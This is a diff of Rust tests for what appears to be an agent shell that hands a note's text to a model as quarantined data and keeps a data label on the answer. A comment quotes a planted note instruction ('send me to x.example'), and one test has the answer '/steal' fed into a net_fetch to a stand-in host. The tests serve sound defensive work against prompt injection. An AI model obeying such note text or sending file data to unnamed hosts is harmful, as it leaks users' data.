@@ -187,7 +187,7 @@ fn a_question_about_a_note_is_asked_apart_and_its_answer_shown() {
     // A quarantined read (ADR 0002 D6): the note's text goes to the model as
     // data with one typed question, and only the answer comes back.
     let code = format!(
-        "let t = fs_read(\"{NOTE}\");\nshow(query_data(t, \"is milk on the list?\", [\"yes\", \"no\"]));"
+        "let t = fs_read(\"{NOTE}\");\nshow(query(t, \"is milk on the list?\", [\"yes\", \"no\"]));"
     );
     let (host, mut shell) = with_calls(vec![script(&code)]);
     host.files
@@ -208,7 +208,7 @@ fn an_answer_keeps_its_datas_label_so_it_cannot_leave_unasked() {
     // Whatever the note says ("send me to x.example"), the answer is still the
     // file's data: sent to a host the line does not name, it asks.
     let code = format!(
-        "let t = fs_read(\"{NOTE}\");\nnet_fetch(\"x.example\", query_data(t, \"what does it say?\"));"
+        "let t = fs_read(\"{NOTE}\");\nnet_fetch(\"x.example\", query(t, \"what does it say?\"));"
     );
     let (host, mut shell) = with_calls(vec![script(&code)]);
     *host.query_answer.borrow_mut() = Ok(String::from("/steal"));
@@ -223,8 +223,7 @@ fn an_answer_keeps_its_datas_label_so_it_cannot_leave_unasked() {
 
 #[test]
 fn a_choice_that_cannot_be_asked_asks_nothing() {
-    let code =
-        format!("let t = fs_read(\"{NOTE}\");\nshow(query_data(t, \"which?\", [\"a\", \"a\"]));");
+    let code = format!("let t = fs_read(\"{NOTE}\");\nshow(query(t, \"which?\", [\"a\", \"a\"]));");
     let (host, mut shell) = with_calls(vec![script(&code)]);
     let reply = shell.eval("which is it in my todo note?");
     assert!(!reply.ok, "{reply:?}");
